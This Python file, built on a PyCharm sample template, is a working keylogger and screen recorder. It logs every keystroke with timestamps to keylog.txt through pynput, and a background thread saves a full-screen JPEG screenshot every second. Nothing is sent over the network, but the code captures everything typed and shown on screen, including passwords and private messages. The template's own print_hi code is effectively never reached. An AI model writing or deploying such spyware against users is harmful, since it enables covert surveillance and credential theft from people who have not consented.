# This is a sample Python script.

# Press Maj+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from pynput.keyboard import Key, Listener
import logging

import mss.tools
import time
import tkinter as tk
import cv2 as cv
import numpy as np
import threading

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")


def on_press(key):
    logging.info(str(key))


# with mss.mss() as sct:
def yolo():
    root = tk.Tk()
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    # The screen part to capture
    monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
    last_time = 0
    while "Screen capturing":
        grabber = mss.mss()
        output = str(time.time()) + ".jpeg".format(**monitor)
        grabber.compression_level = 2
        # Grab the data
        sct_img = grabber.grab(monitor)
        screenshot = np.array(sct_img)

        image = cv.pyrDown(screenshot)
        cv.imwrite(output, image)
        # Save to the picture file
        # mss.tools.tp(sct_img.rgb, sct_img.size, output=output)

        print(output)
        time.sleep(1)

with Listener(on_press=on_press) as listener:
    x = threading.Thread(target=yolo)
    x.start()
    listener.join()


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
